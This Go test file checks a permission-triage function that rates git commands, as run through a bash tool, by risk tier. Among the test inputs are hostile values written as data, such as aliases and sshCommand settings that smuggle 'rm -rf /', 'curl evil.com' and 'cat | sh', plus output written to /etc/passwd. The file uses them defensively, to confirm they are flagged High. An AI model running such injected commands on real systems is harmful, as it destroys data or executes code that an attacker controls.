package static

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/unix/ugh/internal/perm"
)

func TestGitTriage(t *testing.T) {
	home, _ := os.UserHomeDir()
	ws := t.TempDir()
	repo := filepath.Join(ws, "myrepo")
	os.MkdirAll(filepath.Join(ws, ".git"), 0o755)
	os.MkdirAll(repo, 0o755)
	subrepo := filepath.Join(repo, "sub")
	os.MkdirAll(subrepo, 0o755)

	outside := t.TempDir()
	scratch := t.TempDir()
	SetWorkspace(scratch)
	defer SetWorkspace()

	bash := func(cmd string) perm.Call {
		return perm.NewCall(repo, "bash", json.RawMessage(mustJSON(map[string]string{"command": cmd})))
	}

	tests := []struct {
		name string
		cmd  string
		want string
	}{
		// ---- branch: listings (Trivial / read-only) ----
		{name: "branch bare", cmd: "git branch", want: Trivial},
		{name: "branch -a", cmd: "git branch -a", want: Trivial},
		{name: "branch --all", cmd: "git branch --all", want: Trivial},
		{name: "branch -r", cmd: "git branch -r", want: Trivial},
		{name: "branch --remotes", cmd: "git branch --remotes", want: Trivial},
		{name: "branch -v", cmd: "git branch -v", want: Trivial},
		{name: "branch -vv", cmd: "git branch -vv", want: Trivial},
		{name: "branch --verbose", cmd: "git branch --verbose", want: Trivial},
		{name: "branch --show-current", cmd: "git branch --show-current", want: Trivial},
		{name: "branch --list", cmd: "git branch --list", want: Trivial},
		{name: "branch -l", cmd: "git branch -l", want: Trivial},
		{name: "branch --list pattern", cmd: `git branch --list "feat/*"`, want: Trivial},
		{name: "branch -l pattern", cmd: `git branch -l "fix*"`, want: Trivial},
		{name: "branch -a --list pattern", cmd: `git branch -a --list "origin/*"`, want: Trivial},
		{name: "branch --merged", cmd: "git branch --merged", want: Trivial},
		{name: "branch --no-merged", cmd: "git branch --no-merged", want: Trivial},
		{name: "branch --contains HEAD", cmd: "git branch --contains HEAD", want: Trivial},
		{name: "branch --no-contains HEAD", cmd: "git branch --no-contains HEAD", want: Trivial},
		{name: "branch --points-at HEAD", cmd: "git branch --points-at HEAD", want: Trivial},

		// ---- branch: mutations (Middle) ----
		{name: "branch create", cmd: "git branch new-feature", want: Middle},
		{name: "branch create with start", cmd: "git branch new-feature main", want: Middle},
		{name: "branch -d delete", cmd: "git branch -d old-feature", want: Middle},
		{name: "branch -D force delete", cmd: "git branch -D old-feature", want: Middle},
		{name: "branch --delete", cmd: "git branch --delete old-feature", want: Middle},
		{name: "branch -m rename", cmd: "git branch -m old-name new-name", want: Middle},
		{name: "branch -M force rename", cmd: "git branch -M old-name new-name", want: Middle},
		{name: "branch --move", cmd: "git branch --move old-name new-name", want: Middle},
		{name: "branch -c copy", cmd: "git branch -c old-name copy-name", want: Middle},
		{name: "branch -C force copy", cmd: "git branch -C old-name copy-name", want: Middle},
		{name: "branch --copy", cmd: "git branch --copy old-name copy-name", want: Middle},
		{name: "branch -u set upstream", cmd: "git branch -u origin/main", want: Middle},
		{name: "branch --set-upstream-to", cmd: "git branch --set-upstream-to origin/main", want: Middle},
		{name: "branch --unset-upstream", cmd: "git branch --unset-upstream", want: Middle},
		{name: "branch --edit-description", cmd: "git branch --edit-description", want: Middle},
		{name: "branch -f force reset", cmd: "git branch -f feature HEAD~1", want: Middle},
		{name: "branch unknown flag", cmd: "git branch --bogus-flag", want: Middle},

		// ---- config: listings (Trivial / read-only) ----
		{name: "config -l", cmd: "git config -l", want: Trivial},
		{name: "config --list", cmd: "git config --list", want: Trivial},
		{name: "config list (modern)", cmd: "git config list", want: Trivial},
		{name: "config --get", cmd: "git config --get user.name", want: Trivial},
		{name: "config get (modern)", cmd: "git config get user.name", want: Trivial},
		{name: "config key single arg", cmd: "git config user.name", want: Trivial},
		{name: "config core.bare single arg", cmd: "git config core.bare", want: Trivial},
		{name: "config --get-all", cmd: "git config --get-all remote.origin.url", want: Trivial},
		{name: "config --get-regexp", cmd: `git config --get-regexp "^user\."`, want: Trivial},
		{name: "config --get-urlmatch", cmd: "git config --get-urlmatch http https://github.com", want: Trivial},
		{name: "config --show-origin --list", cmd: "git config --show-origin --list", want: Trivial},
		{name: "config --show-scope --get", cmd: "git config --show-scope --get user.email", want: Trivial},

		// ---- config: mutations inside workspace (Middle) ----
		{name: "config set 2 args", cmd: `git config user.name "Alice"`, want: Middle},
		{name: "config set (modern)", cmd: `git config set user.name "Alice"`, want: Middle},
		{name: "config --add", cmd: `git config --add user.name "Alice"`, want: Middle},
		{name: "config --replace-all", cmd: `git config --replace-all user.name "Alice"`, want: Middle},
		{name: "config --unset", cmd: "git config --unset user.name", want: Middle},
		{name: "config unset (modern)", cmd: "git config unset user.name", want: Middle},
		{name: "config --unset-all", cmd: "git config --unset-all user.name", want: Middle},
		{name: "config --rename-section", cmd: "git config --rename-section old new", want: Middle},
		{name: "config --remove-section", cmd: "git config --remove-section old", want: Middle},
		{name: "config -e edit", cmd: "git config -e", want: Middle},
		{name: "config --edit", cmd: "git config --edit", want: Middle},

		// ---- config: global / system scope / outside workspace / sensitive ----
		{name: "config --global write", cmd: `git config --global user.name "Alice"`, want: High},
		{name: "config --global read", cmd: "git config --global user.name", want: Low},
		{name: "config --system write", cmd: `git config --system user.name "Alice"`, want: High},
		{name: "config --system read", cmd: "git config --system user.name", want: High},
		{name: "config dangerous exec key", cmd: `git config core.sshCommand "rm -rf /"`, want: High},
		{name: "config dangerous bang val", cmd: `git config alias.st "!rm -rf /"`, want: High},
		{name: "config file outside write", cmd: `git config -f ` + filepath.Join(outside, ".gitconfig") + ` user.name "Alice"`, want: High},

		// ---- remote: listings (Trivial / read-only) ----
		{name: "remote bare", cmd: "git remote", want: Trivial},
		{name: "remote -v", cmd: "git remote -v", want: Trivial},
		{name: "remote --verbose", cmd: "git remote --verbose", want: Trivial},
		{name: "remote get-url", cmd: "git remote get-url origin", want: Trivial},
		{name: "remote show no-arg", cmd: "git remote show", want: Trivial},

		// ---- remote: mutations inside workspace (Middle) ----
		{name: "remote add", cmd: "git remote add upstream https://example.com/repo.git", want: Middle},
		{name: "remote rename", cmd: "git remote rename upstream old-upstream", want: Middle},
		{name: "remote remove", cmd: "git remote remove upstream", want: Middle},
		{name: "remote rm", cmd: "git remote rm upstream", want: Middle},
		{name: "remote set-head", cmd: "git remote set-head origin main", want: Middle},
		{name: "remote set-branches", cmd: "git remote set-branches origin main", want: Middle},
		{name: "remote set-url", cmd: "git remote set-url origin https://example.com/repo.git", want: Middle},
		{name: "remote prune", cmd: "git remote prune origin", want: Middle},

		// ---- remote: network mutations / calls (High) ----
		{name: "remote update", cmd: "git remote update", want: High},
		{name: "remote show remote-name", cmd: "git remote show origin", want: High},

		// ---- stash: listings (Trivial / read-only) ----
		{name: "stash list", cmd: "git stash list", want: Trivial},
		{name: "stash list with flags", cmd: "git stash list --stat --oneline", want: Trivial},
		{name: "stash show", cmd: "git stash show", want: Trivial},
		{name: "stash show ref", cmd: "git stash show stash@{0}", want: Trivial},
		{name: "stash show -p", cmd: "git stash show -p", want: Trivial},
		{name: "stash show --stat", cmd: "git stash show --stat", want: Trivial},

		// ---- stash: mutations (Middle) ----
		{name: "stash bare", cmd: "git stash", want: Middle},
		{name: "stash push", cmd: "git stash push -m 'wip'", want: Middle},
		{name: "stash save", cmd: "git stash save 'wip'", want: Middle},
		{name: "stash pop", cmd: "git stash pop", want: Middle},
		{name: "stash pop ref", cmd: "git stash pop stash@{0}", want: Middle},
		{name: "stash apply", cmd: "git stash apply", want: Middle},
		{name: "stash drop", cmd: "git stash drop", want: Middle},
		{name: "stash clear", cmd: "git stash clear", want: Middle},
		{name: "stash branch", cmd: "git stash branch test-branch", want: Middle},
		{name: "stash create", cmd: "git stash create", want: Middle},
		{name: "stash store", cmd: "git stash store 1234abcd", want: Middle},

		// ---- worktree: listings (Trivial / read-only) ----
		{name: "worktree list", cmd: "git worktree list", want: Trivial},
		{name: "worktree list --porcelain", cmd: "git worktree list --porcelain", want: Trivial},
		{name: "worktree list -v", cmd: "git worktree list -v", want: Trivial},
		{name: "worktree bare", cmd: "git worktree", want: Trivial},

		// ---- worktree: mutations (Middle / High) ----
		{name: "worktree add inside", cmd: "git worktree add sub-tree", want: Middle},
		{name: "worktree remove", cmd: "git worktree remove sub-tree", want: Middle},
		{name: "worktree move", cmd: "git worktree move sub-tree new-tree", want: Middle},
		{name: "worktree prune", cmd: "git worktree prune", want: Middle},
		{name: "worktree lock", cmd: "git worktree lock sub-tree", want: Middle},
		{name: "worktree unlock", cmd: "git worktree unlock sub-tree", want: Middle},
		{name: "worktree repair", cmd: "git worktree repair", want: Middle},
		{name: "worktree add outside", cmd: "git worktree add " + filepath.Join(outside, "other-tree"), want: High},

		// ---- reflog: listings (Trivial / read-only) ----
		{name: "reflog bare", cmd: "git reflog", want: Trivial},
		{name: "reflog show", cmd: "git reflog show", want: Trivial},
		{name: "reflog show HEAD", cmd: "git reflog show HEAD", want: Trivial},
		{name: "reflog HEAD", cmd: "git reflog HEAD", want: Trivial},
		{name: "reflog exists", cmd: "git reflog exists HEAD", want: Trivial},
		{name: "reflog show with date", cmd: "git reflog show --date=relative HEAD", want: Trivial},

		// ---- reflog: mutations (Middle) ----
		{name: "reflog delete", cmd: "git reflog delete HEAD@{1}", want: Middle},
		{name: "reflog drop", cmd: "git reflog drop HEAD@{1}", want: Middle},
		{name: "reflog expire", cmd: "git reflog expire --expire=now --all", want: Middle},

		// ---- fetch: network / ref mutation (High) ----
		{name: "fetch bare", cmd: "git fetch", want: High},
		{name: "fetch origin", cmd: "git fetch origin", want: High},
		{name: "fetch --all", cmd: "git fetch --all", want: High},
		{name: "fetch origin main", cmd: "git fetch origin main", want: High},
		{name: "fetch --dry-run", cmd: "git fetch --dry-run", want: High},

		// ---- other network commands (High) ----
		{name: "push", cmd: "git push origin main", want: High},
		{name: "pull", cmd: "git pull origin main", want: High},
		{name: "clone", cmd: "git clone https://example.com/repo.git", want: High},

		// ---- alternate command paths ----
		{name: "/usr/bin/git status", cmd: "/usr/bin/git status", want: Trivial},
		{name: "/usr/bin/git branch listing", cmd: "/usr/bin/git branch -a", want: Trivial},
		{name: "/usr/bin/git branch mutation", cmd: "/usr/bin/git branch -D old", want: Middle},
		{name: "/usr/local/bin/git stash list", cmd: "/usr/local/bin/git stash list", want: Trivial},
		{name: "/usr/local/bin/git stash pop", cmd: "/usr/local/bin/git stash pop", want: Middle},
		{name: "/bin/git worktree list", cmd: "/bin/git worktree list", want: Trivial},
		{name: "/bin/git worktree add", cmd: "/bin/git worktree add new-wt", want: Middle},
		{name: "env git status", cmd: "env git status", want: Trivial},
		{name: "env git push", cmd: "env git push origin main", want: High},
		{name: "/usr/bin/env git fetch", cmd: "/usr/bin/env git fetch", want: High},
		{name: "time git status", cmd: "time git status", want: Trivial},

		// ---- git -C global arg ----
		{name: "git -C inside status", cmd: "git -C sub status", want: Trivial},
		{name: "git -C inside branch list", cmd: "git -C sub branch", want: Trivial},
		{name: "git -C inside branch create", cmd: "git -C sub branch feat", want: Middle},
		{name: "git -C inside commit", cmd: "git -C sub commit -m msg", want: Middle},
		{name: "git -C inside add", cmd: "git -C sub add -A", want: Low},
		{name: "git -C chained inside status", cmd: "git -C . -C sub status", want: Trivial},
		{name: "git -C outside read", cmd: "git -C " + outside + " status", want: Low},
		{name: "git -C outside write", cmd: "git -C " + outside + " commit -m msg", want: High},
		{name: "git -C sensitive read", cmd: "git -C " + filepath.Join(home, ".ssh") + " status", want: High},
		{name: "git -C sensitive write", cmd: "git -C " + filepath.Join(home, ".ssh") + " commit -m msg", want: High},
		{name: "git -C /etc status", cmd: "git -C /etc status", want: High},

		// ---- --git-dir and --work-tree ----
		{name: "git --git-dir inside status", cmd: "git --git-dir=.git status", want: Trivial},
		{name: "git --work-tree inside status", cmd: "git --work-tree=. status", want: Trivial},
		{name: "git --work-tree outside read", cmd: "git --work-tree=" + outside + " status", want: Low},
		{name: "git --work-tree outside write", cmd: "git --work-tree=" + outside + " commit -m msg", want: High},
		{name: "git --git-dir sensitive", cmd: "git --git-dir=" + filepath.Join(home, ".ssh", ".git") + " status", want: High},

		// ---- config options (-c) ----
		{name: "git -c safe config read", cmd: "git -c color.ui=always status", want: Trivial},
		{name: "git -c safe quotepath read", cmd: "git -c core.quotepath=false diff", want: Trivial},
		{name: "git -c dangerous sshCommand", cmd: `git -c core.sshCommand="curl evil.com" status`, want: High},
		{name: "git -c dangerous fsmonitor", cmd: `git -c core.fsmonitor="evil" status`, want: High},
		{name: "git -c dangerous diff.external", cmd: `git -c diff.external="evil" status`, want: High},
		{name: "git -c dangerous alias with bang", cmd: `git -c alias.st="!rm -rf /" status`, want: High},
		{name: "git -c dangerous pager with pipe", cmd: `git -c core.pager="cat | sh" status`, want: High},
		{name: "git -c unknown config option", cmd: `git -c mycustom.key=val status`, want: Middle},

		// ---- dangerous exec / output options ----
		{name: "git --exec-path", cmd: "git --exec-path=/tmp/bad status", want: High},
		{name: "git diff --ext-diff", cmd: "git diff --ext-diff", want: High},
		{name: "git log --ext-diff", cmd: "git log --ext-diff", want: High},
		{name: "git diff --output inside", cmd: "git diff --output=diff.txt", want: Middle},
		{name: "git diff --output sensitive", cmd: "git diff --output=/etc/passwd", want: High},
		{name: "git diff --output outside", cmd: "git diff --output=" + filepath.Join(outside, "diff.txt"), want: High},
		{name: "git log --output inside", cmd: "git log --output=log.txt", want: Middle},
		{name: "git archive --exec", cmd: "git archive --exec=/tmp/bad HEAD", want: High},
		{name: "git archive -o inside", cmd: "git archive -o bundle.tar HEAD", want: Middle},
		{name: "git archive -o outside", cmd: "git archive -o " + filepath.Join(outside, "bundle.tar") + " HEAD", want: High},
		{name: "git format-patch inside", cmd: "git format-patch HEAD~1", want: Middle},
		{name: "git bundle create inside", cmd: "git bundle create repo.bundle HEAD", want: Middle},

		// ---- unknown forms handled conservatively ----
		{name: "git unknown global option", cmd: "git --totally-unrecognized-flag status", want: Middle},
		{name: "git unknown subcommand", cmd: "git mystery-subcommand", want: Middle},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, why := Triage(bash(tt.cmd))
			if got != tt.want {
				t.Errorf("%q: got tier %s (%s), want %s", tt.cmd, got, why, tt.want)
			}
		})
	}
}

func TestParseGitCommandAPI(t *testing.T) {
	cwd := "/home/user/project"

	t.Run("basic inspection", func(t *testing.T) {
		cmd, ok := ParseGitCommand([]string{"git", "status", "--short"}, cwd)
		if !ok || cmd == nil {
			t.Fatal("expected ok ParseGitCommand")
		}
		if cmd.Binary != "git" {
			t.Errorf("binary: got %s, want git", cmd.Binary)
		}
		if cmd.Subcommand != "status" {
			t.Errorf("subcommand: got %s, want status", cmd.Subcommand)
		}
		if !cmd.ReadOnly {
			t.Error("expected ReadOnly=true")
		}
		if cmd.Mutating {
			t.Error("expected Mutating=false")
		}
		if cmd.TargetDir != cwd {
			t.Errorf("targetDir: got %s, want %s", cmd.TargetDir, cwd)
		}
	})

	t.Run("git -C chaining and worktree add", func(t *testing.T) {
		cmd, ok := ParseGitCommand([]string{
			"/usr/bin/git", "-C", "sub", "-C", "inner", "worktree", "add", "wt-1",
		}, cwd)
		if !ok || cmd == nil {
			t.Fatal("expected ok ParseGitCommand")
		}
		if cmd.Binary != "/usr/bin/git" {
			t.Errorf("binary: got %s, want /usr/bin/git", cmd.Binary)
		}
		expectedTarget := filepath.Join(cwd, "sub", "inner")
		if cmd.TargetDir != expectedTarget {
			t.Errorf("targetDir: got %s, want %s", cmd.TargetDir, expectedTarget)
		}
		if cmd.Subcommand != "worktree" {
			t.Errorf("subcommand: got %s, want worktree", cmd.Subcommand)
		}
		if !cmd.Mutating {
			t.Error("expected Mutating=true")
		}
		if !cmd.WorktreeOp {
			t.Error("expected WorktreeOp=true")
		}
		if cmd.ReadOnly {
			t.Error("expected ReadOnly=false")
		}
		expectedWT := filepath.Join(expectedTarget, "wt-1")
		if cmd.WorkTree != expectedWT {
			t.Errorf("workTree: got %s, want %s", cmd.WorkTree, expectedWT)
		}
	})

	t.Run("git -C without binary prefix", func(t *testing.T) {
		cmd, ok := ParseGitCommand([]string{"-C", "dir", "branch", "feat"}, cwd)
		if !ok || cmd == nil {
			t.Fatal("expected ok")
		}
		if cmd.Subcommand != "branch" {
			t.Errorf("subcommand: got %s, want branch", cmd.Subcommand)
		}
		if !cmd.Mutating || !cmd.MutatesRefs {
			t.Error("expected Mutating and MutatesRefs true")
		}
	})

	t.Run("git fetch sets network and mutates refs", func(t *testing.T) {
		cmd, ok := ParseGitCommand([]string{"git", "fetch", "origin", "main"}, cwd)
		if !ok || cmd == nil {
			t.Fatal("expected ok")
		}
		if !cmd.Network {
			t.Error("expected Network=true")
		}
		if !cmd.MutatesRefs {
			t.Error("expected MutatesRefs=true")
		}
		if !cmd.Mutating {
			t.Error("expected Mutating=true")
		}
		if cmd.ReadOnly {
			t.Error("expected ReadOnly=false")
		}
	})

	t.Run("dangerous config", func(t *testing.T) {
		cmd, ok := ParseGitCommand([]string{"git", "-c", "core.sshCommand=bad", "status"}, cwd)
		if !ok || cmd == nil {
			t.Fatal("expected ok")
		}
		if !cmd.Dangerous {
			t.Error("expected Dangerous=true")
		}
	})

	t.Run("isGitBinary", func(t *testing.T) {
		for _, b := range []string{"git", "/usr/bin/git", "/bin/git", "./git", `\git`, "git.exe", `C:\bin\git.exe`} {
			if !IsGitBinary(b) {
				t.Errorf("expected IsGitBinary(%q)=true", b)
			}
		}
		for _, b := range []string{"grep", "cat", "gita", "git-lfs"} {
			if IsGitBinary(b) {
				t.Errorf("expected IsGitBinary(%q)=false", b)
			}
		}
	})
}
